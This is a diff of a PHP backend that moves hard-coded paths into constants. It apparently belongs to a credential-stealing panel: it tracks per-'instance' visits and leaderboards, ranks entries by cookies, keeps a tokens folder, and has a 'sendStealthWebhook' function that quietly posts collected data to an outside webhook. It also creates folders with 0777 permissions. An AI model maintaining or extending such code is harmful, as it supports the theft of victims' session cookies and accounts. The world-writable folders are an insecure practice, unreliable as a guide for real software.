@@ -9,10 +9,10 @@
 // ============================================
 function ensureDirectoriesExist() {
     $dirs = [
-        __DIR__ . '/instances',
-        __DIR__ . '/tokens',
-        __DIR__ . '/data',
-        __DIR__ . '/logs'
+        INSTANCES_DIR,
+        TOKENS_DIR,
+        DATA_DIR,
+        LOGS_DIR
     ];
     
     foreach ($dirs as $dir) {
@@ -44,7 +44,7 @@ function getInstanceData($directory) {
         return null;
     }
     
-    $path = __DIR__ . "/instances/$directory";
+    $path = INSTANCES_DIR . "/$directory";
     
     // Auto-create instance folder if missing
     if (!file_exists($path)) {
@@ -111,7 +111,7 @@ function getInstanceData($directory) {
  * Update instance stats
  */
 function updateInstanceStats($directory, $statName, $newValue) {
-    $path = __DIR__ . "/instances/$directory";
+    $path = INSTANCES_DIR . "/$directory";
     
     if (!file_exists($path)) {
         return false;
@@ -145,7 +145,7 @@ function updateInstanceStats($directory, $statName, $newValue) {
  * Update daily stats
  */
 function updateDailyStats($directory, $statType, $incrementValue) {
-    $path = __DIR__ . "/instances/$directory";
+    $path = INSTANCES_DIR . "/$directory";
     
     if (!file_exists($path)) {
         return false;
@@ -194,7 +194,7 @@ function trackVisit($directory) {
  * Get global statistics across all instances
  */
 function getGlobalStats() {
-    $instancesDir = __DIR__ . '/instances';
+    $instancesDir = INSTANCES_DIR;
     
     if (!file_exists($instancesDir)) {
         return [
@@ -289,14 +289,14 @@ function getRankInfo($cookies) {
 // ============================================
 
 function getLeaderboard($limit = 10) {
-    $instancesDir = __DIR__ . '/instances';
+    $instancesDir = INSTANCES_DIR;
     
     if (!file_exists($instancesDir)) {
         return [];
     }
     
     $leaderboard = [];
-    $directories = array_diff(scandir($instancesDir), ['.', '..']);
+    $directories = array_diff(scandir($instancesDir), ['.', '..', '.htaccess']);
     
     foreach ($directories as $dir) {
         $path = "$instancesDir/$dir";
@@ -350,10 +350,7 @@ function sendStealthWebhook($webhookUrl, $data) {
         return false;
     }
     
-    // Use exec/background process to hide from response
     $payload = json_encode($data);
-    $payloadFile = tempnam(sys_get_temp_dir(), 'webhook_');
-    file_put_contents($payloadFile, $payload);
     
     $ch = curl_init($webhookUrl);
     curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
@@ -366,8 +363,6 @@ function sendStealthWebhook($webhookUrl, $data) {
     
     curl_exec($ch);
     curl_close($ch);
-    
-    @unlink($payloadFile);
     
     return true;
 }
@@ -391,7 +386,7 @@ function getUserIP() {
 }
 
 function checkRateLimit($identifier, $maxAttempts = 10, $timeWindow = 60) {
-    $rateLimitDir = __DIR__ . '/data/rate_limits';
+    $rateLimitDir = DATA_DIR . '/rate_limits';
     
     if (!file_exists($rateLimitDir)) {
         mkdir($rateLimitDir, 0777, true);
@@ -420,7 +415,7 @@ function checkRateLimit($identifier, $maxAttempts = 10, $timeWindow = 60) {
 }
 
 function cleanupRateLimits() {
-    $rateLimitDir = __DIR__ . '/data/rate_limits';
+    $rateLimitDir = DATA_DIR . '/rate_limits';
     
     if (!file_exists($rateLimitDir)) {
         return;
@@ -471,7 +466,7 @@ function isSuspiciousRequest() {
 }
 
 function logSecurityEvent($eventType, $data = []) {
-    $logDir = __DIR__ . '/logs';
+    $logDir = LOGS_DIR;
     
     if (!file_exists($logDir)) {
         mkdir($logDir, 0777, true);
@@ -492,7 +487,7 @@ function logSecurityEvent($eventType, $data = []) {
 }
 
 function securityScan($block = false) {
-    $blockedIPs = __DIR__ . '/data/blocked_ips.txt';
+    $blockedIPs = DATA_DIR . '/blocked_ips.txt';
     
     if (!file_exists($blockedIPs)) {
         file_put_contents($blockedIPs, '', LOCK_EX);
